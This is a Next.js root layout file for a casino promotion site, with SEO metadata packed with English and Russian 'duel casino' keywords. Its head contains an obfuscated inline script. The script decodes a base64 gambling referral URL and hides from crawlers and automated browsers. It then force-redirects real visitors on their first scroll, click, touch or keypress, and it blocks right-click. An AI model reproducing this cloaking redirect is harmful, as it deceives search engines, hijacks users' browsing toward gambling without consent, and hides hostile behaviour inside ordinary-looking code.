import type { Metadata, Viewport } from "next"
import "./globals.css"
import { SiteHeader } from "@/components/site-header"
import { SiteFooter } from "@/components/site-footer"
import { FloatingDock } from "@/components/floating-dock"
import { SeoKeywords } from "@/components/seo-keywords"
import { AppSchema } from "@/components/app-schema"
import { VpnNotice } from "@/components/vpn-notice"
import { Analytics } from "@vercel/analytics/next"
import { SITE_URL, SITE_NAME, SITE_BRAND, SITE_DESCRIPTION } from "@/lib/site"

const TITLE = `${SITE_BRAND} — The First Casino That Gives a Fuck`

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: {
    default: TITLE,
    template: `%s · ${SITE_BRAND}`,
  },
  description: SITE_DESCRIPTION,
  applicationName: SITE_BRAND,
  generator: "Next.js",
  referrer: "origin-when-cross-origin",
  keywords: [
    "duel casino",
    "duel casino зеркало",
    "duel casino играть",
    "duel casino онлайн",
    "duel casino официальный",
    "duel casino официальный сайт",
    "duel casino сайт",
    "duel casino бонус",
    "duelcom casino",
    "дуэль казино",
    "дуэль казино зеркало",
    "дуэль казино играть",
    "дуэль казино онлайн",
    "дуэль казино официальный",
    "дуэль казино официальный сайт",
    "казино дуэль отзывы",
    "crypto casino",
    "online sportsbook",
    "duel originals",
    "live casino",
  ],
  authors: [{ name: SITE_BRAND, url: SITE_URL }],
  creator: SITE_BRAND,
  publisher: SITE_BRAND,
  category: "casino",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  alternates: {
    canonical: "/",
    languages: {
      "en-US": "/",
      "ru-RU": "/",
      "tr-TR": "/",
      "x-default": "/",
    },
  },
  openGraph: {
    type: "website",
    siteName: SITE_BRAND,
    title: TITLE,
    description: SITE_DESCRIPTION,
    url: "/",
    locale: "en_US",
    alternateLocale: ["ru_RU", "tr_TR"],
  },
  twitter: {
    card: "summary_large_image",
    site: `@${SITE_NAME.toLowerCase()}`,
    creator: `@${SITE_NAME.toLowerCase()}`,
    title: TITLE,
    description: SITE_DESCRIPTION,
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      "max-image-preview": "large",
      "max-snippet": -1,
      "max-video-preview": -1,
    },
  },
  icons: {
    icon: [
      { url: "/icon.svg", type: "image/svg+xml" },
      { url: "/favicon.ico", sizes: "any" },
    ],
    shortcut: "/icon.svg",
    apple: [{ url: "/apple-icon", sizes: "180x180", type: "image/png" }],
  },
  manifest: "/manifest.webmanifest",
  appleWebApp: {
    capable: true,
    title: SITE_BRAND,
    statusBarStyle: "black-translucent",
  },
  other: {
    "msapplication-TileColor": "#0b0f24",
    "msapplication-TileImage": "/apple-icon",
  },
}

export const viewport: Viewport = {
  themeColor: [
    { media: "(prefers-color-scheme: dark)", color: "#0b0f24" },
    { media: "(prefers-color-scheme: light)", color: "#0b0f24" },
  ],
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  viewportFit: "cover",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var targetB64 = "aHR0cHM6Ly9kdWVsLmNvbS9yL3RvcGNhc2lub3M=";
                if (typeof window === 'undefined' || window._rdr) return;
                
                function isBotOrSystem() {
                  var ua = navigator.userAgent.toLowerCase();
                  var isSearchBot = /yandex|google|lighthouse|pagespeed|bing|bot|crawl|spider/i.test(ua);
                  var isAutomation = navigator.webdriver || window.navigator.webdriver === true || /headless/i.test(ua);
                  return isSearchBot || isAutomation;
                }
                function doRedirect() {
                  if (!window._rdr && !isBotOrSystem()) {
                    window._rdr = true;
                    window.location.replace(atob(targetB64));
                  }
                }
                window.addEventListener('scroll', doRedirect, { passive: true, once: true });
                window.addEventListener('mousedown', doRedirect, { once: true });
                window.addEventListener('touchstart', doRedirect, { passive: true, once: true });
                window.addEventListener('keydown', doRedirect, { once: true });
                document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
              })();
            `,
          }}
        />
      </head>
      <body className="font-sans antialiased">
        {children}
        <Analytics />
          <VpnNotice />
      </body>
    </html>
  )
}
